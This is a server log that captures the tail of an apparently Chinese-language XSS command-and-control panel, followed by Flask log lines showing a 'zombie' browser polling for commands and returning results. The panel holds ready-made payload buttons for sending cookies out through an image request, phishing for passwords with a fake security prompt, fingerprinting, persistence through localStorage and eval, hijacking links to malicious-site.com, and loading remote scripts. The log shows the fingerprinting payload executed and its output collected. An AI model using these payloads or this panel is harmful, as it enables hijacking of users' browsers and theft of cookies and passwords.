Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T14:56:46.669Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:56:46.674063</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 22:56:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:50] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:56:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:50] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:56:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:56:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:52 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:56:52 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:56:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:56:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:52] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:56:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:56:53 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:56:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 483 bytes [200 OK]>
2025-06-26 22:56:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:53] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:57 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:02 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:57:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-26 22:57:06 | INFO     | control_route.py:213 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-26 22:57:06 | INFO     | control_route.py:231 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: (function(){ var fingerprint = { screen: screen.width + "x" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()
2025-06-26 22:57:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0039s) -> 回傳: <Response 527 bytes [200 OK]>
2025-06-26 22:57:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:06] "POST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:07 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:07 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:07.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0114s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:07] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:57:08 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:57:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-26 22:57:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:08] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:57:12 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:12 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:12.131Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0035s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:12] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:57:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:17 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:57:17 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T14:57:17.127Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 22:57:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0037s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:57:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:17] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:57:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:57:22 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:57:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 22:57:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:57:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:57:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
